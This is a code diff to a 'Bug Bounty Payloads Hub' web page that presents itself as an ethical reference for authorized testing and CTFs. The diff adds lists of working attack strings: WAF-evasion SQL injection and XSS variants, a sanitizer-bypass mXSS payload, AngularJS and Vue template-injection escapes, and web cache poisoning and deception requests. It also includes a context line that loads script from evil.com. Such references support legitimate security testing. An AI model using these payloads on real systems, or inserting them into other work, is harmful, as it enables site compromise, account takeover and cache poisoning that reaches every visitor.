@@ -556,7 +556,7 @@
 
 <section class="hero">
   <h1 id="heroTitle" data-text="Bug Bounty Payloads Hub">Bug Bounty Payloads Hub</h1>
-  <p>An ethical, offline-first reference of payload patterns for authorized testing, CTFs, and education. Fast, private, hardened — built like it's 2050.</p>
+  <p>An ethical, offline reference for authorized testing, CTFs, and education. Modern WAFs and frameworks eat the textbook strings — so these lean on bypass techniques, framework gadgets, and filter-agnostic classes you adapt to the sink.</p>
   <div class="stat-row" id="statRow">
     <div><b id="statCats">0</b> categories</div>
     <div><b id="statPayloads">0</b> payloads</div>
@@ -637,6 +637,22 @@ const DATA = [
     "../../../../../../etc/passwd%00.png"
   ]},
 
+  { id:"waf", title:"WAF / Filter Evasion", icon:"🧱", sev:"high", tags:["bypass","waf","evasion"],
+    desc:"The mutation layer — turning a blocked payload into a working one by desyncing the WAF from the app: case, comments, encoding, protocol and HPP tricks.", items:[
+    { p:"UNION/*!50000SELECT*/1,2,3-- -", t:"w", n:"MySQL versioned comment — runs on MySQL, the WAF ignores the comment body" },
+    { p:"/*!50000UnIoN*//*!50000SeLeCt*/1,2,3-- -", n:"case-mangled + versioned comment beats keyword signatures" },
+    { p:"0e0union select 1,2,3-- -", n:"scientific-notation prefix breaks 'digits then UNION' rules" },
+    { p:"?id=1&id=2  (HTTP parameter pollution)", t:"w", n:"the WAF inspects one value, the app uses the other" },
+    { p:"select%0b1%0bfrom%0busers  (%0b/%0c/%a0 whitespace)", n:"non-space separators where the rule only expects space/tab" },
+    { p:"<a href=\"javas&Tab;cript:alert(1)\">x</a>", t:"w", n:"&Tab;/&NewLine; entity splits the scheme past the filter" },
+    { p:"<svg><animate attributeName=href values=javascript:alert(1)>", t:"w", n:"handler-free XSS most WAF signatures don't model" },
+    { p:"＜script＞alert(1)＜/script＞  (fullwidth)", n:"lands when the backend NFKC-normalizes to ASCII after the WAF" },
+    { p:"%253Cscript%253Ealert(1)%253C%252Fscript%253E", t:"w", n:"double URL-encode — the WAF decodes once, the app twice" },
+    { p:"payload placed in a multipart/form-data part body", n:"some WAFs never inspect multipart part bodies" },
+    { p:"split the injection across Transfer-Encoding: chunked chunks", t:"w", n:"WAF and origin reassemble the body differently" },
+    { p:"X-Original-URL: /admin   |   X-Rewrite-URL: /admin", t:"w", n:"front-end routes/ACLs on the original path — bypasses path rules" }
+  ]},
+
   { id:"xss", title:"XSS (Reflected / Stored)", icon:"⚡", sev:"high", tags:["injection","client","html"],
     desc:"Creative HTML/attribute breakouts — interaction-free handlers, CSS-driven fires, and filter-evading tags.", items:[
     { p:"<svg><animate onbegin=alert() attributeName=x dur=1s>", t:"w", n:"Fires with no user interaction; passes many tag blocklists" },
@@ -665,7 +681,22 @@ const DATA = [
     "<script type=importmap>{\"imports\":{\"x\":\"//evil.com/x.js\"}}<\/script>",
     { p:"eval(window.name)", n:"set window.name on the attacker page, then navigate to the sink" },
     "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert()>",
+    { p:"<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>", t:"w", n:"namespace-confusion mXSS — the sanitizer / DOMPurify bypass class" },
     "window.postMessage('<img src=x onerror=alert()>','*')"
+  ]},
+
+  { id:"csti", title:"Client-Side Template Injection", icon:"⚗️", sev:"high", tags:["client","template","framework"],
+    desc:"SPA reality — Angular/Vue expression-sandbox escapes and framework raw-HTML sinks that fire where a classic <script> is auto-escaped.", items:[
+    { p:"{{constructor.constructor('alert(1)')()}}", t:"w", n:"AngularJS — any {{ }} context (sandbox removed in 1.6)" },
+    { p:"{{$eval.constructor('alert(1)')()}}", n:"AngularJS variant" },
+    { p:"{{toString.constructor('alert(1)')()}}", n:"AngularJS gadget via a built-in" },
+    { p:"{{_c.constructor('alert(1)')()}}", t:"w", n:"Vue 2 render-context escape" },
+    { p:"{{$emit.constructor('alert(1)')()}}", n:"Vue 2 / 3 client template injection" },
+    { p:"{{_openBlock.constructor('alert(1)')()}}", n:"Vue 3 gadget" },
+    { p:"React: href={x} with x=\"javascript:alert(1)\"", t:"w", n:"React still renders javascript: hrefs (only warns) — a live sink" },
+    { p:"React: dangerouslySetInnerHTML={{__html:x}}", t:"w", n:"React's one escape hatch — no auto-escaping" },
+    { p:"Svelte {@html x}  /  Next.js __html", n:"framework raw-HTML sinks" },
+    { p:"$sce.trustAsHtml(x)  (Angular)", n:"explicit sanitizer-trust bypass" }
   ]},
 
   { id:"csp", title:"CSP Bypass", icon:"🛡️", sev:"med", tags:["client","bypass","defense"],
@@ -937,6 +968,19 @@ const DATA = [
     "H2.TE — HTTP/2 request carrying transfer-encoding: chunked",
     "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: x  (smuggled prefix)",
     { p:"CRLF in an HTTP/2 header value", n:"request splitting on downgrade → cache poisoning" }
+  ]},
+
+  { id:"cache", title:"Web Cache Poisoning / Deception", icon:"🗄️", sev:"high", tags:["cache","server","http"],
+    desc:"Filter-agnostic — poison a shared cache through unkeyed request inputs, or trick a CDN into caching someone else's private page.", items:[
+    { p:"X-Forwarded-Host: evil.com", t:"w", n:"unkeyed header reflected into absolute URLs / reset links — poisoned for every user" },
+    { p:"X-Forwarded-Scheme: http   |   X-Forwarded-Proto: http", n:"forces a cached redirect loop or downgrade" },
+    { p:"X-Host / X-Forwarded-Server / X-Original-URL probes", n:"hunt for the unkeyed header that reaches the response" },
+    { p:"GET /account/wallet.css  (nonexistent .css under a private path)", t:"w", n:"cache deception — the CDN stores the private HTML as a static asset" },
+    { p:"/account%00.css  /  /account;.css  /  /account?.css", n:"path-confusion variants for deception" },
+    { p:"X-Forwarded-Host: evil → reflected into a script-src path", t:"w", n:"stored-XSS-by-cache via the reflected host" },
+    { p:"send a body on a cached GET (fat GET)", n:"cache-key mismatch / parameter cloaking" },
+    { p:"drop Accept-Encoding to hit a different Vary key", n:"widen the poisoned audience" },
+    "?cachebuster=1  (isolate one cache key while probing)"
   ]},
 
   { id:"ws", title:"WebSocket Attacks", icon:"🔌", sev:"med", tags:["client","websocket","api"],
